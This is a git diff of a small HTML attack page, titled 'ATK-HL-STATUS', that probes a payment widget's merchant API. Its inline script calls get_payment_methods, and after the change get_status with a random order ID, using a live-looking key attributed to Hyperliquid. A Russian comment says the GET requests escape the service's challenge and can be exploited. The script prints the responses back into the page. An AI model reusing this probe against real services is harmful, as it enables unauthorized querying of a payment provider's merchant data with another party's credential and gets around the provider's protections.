@@ -1,17 +1,16 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-HL-GET</title></head>
-<body><pre id="out">HL-GET-START</pre>
+<html><head><meta charset="utf-8"><title>ATK-HL-STATUS</title></head>
+<body><pre id="out">HL-ST-START</pre>
 <script>
 try {
-  // GET запросы не челленджутся! Используем их.
-  // get_payment_methods с ключом Hyperliquid
+  // GET get_status с ключом Hyperliquid и случайным UUID
   var xhr = new XMLHttpRequest();
-  xhr.open("GET", "https://widget.swapped.com/api/v1/merchant/get_payment_methods?apiKey=pk_live_5cf10a0d2c6fffd8e92c8ee633b69b02", false);
+  xhr.open("GET", "https://widget.swapped.com/api/v1/merchant/get_status?apiKey=pk_live_5cf10a0d2c6fffd8e92c8ee633b69b02&order_id=c44a8091-0017-4010-8652-0e3b5561cf68", false);
   xhr.send();
-  document.title = "HL-GET-" + xhr.status;
-  document.getElementById("out").textContent = "HL-GET-RESULT " + xhr.status + " :: " + xhr.responseText.slice(0, 500);
+  document.title = "HL-ST-" + xhr.status;
+  document.getElementById("out").textContent = "HL-ST-RESULT " + xhr.status + " :: " + xhr.responseText.slice(0, 500);
 } catch (e) {
-  document.title = "HL-GET-ERR";
-  document.getElementById("out").textContent = "HL-GET-ERR " + e.message;
+  document.title = "HL-ST-ERR";
+  document.getElementById("out").textContent = "HL-ST-ERR " + e.message;
 }
 </script></body></html>
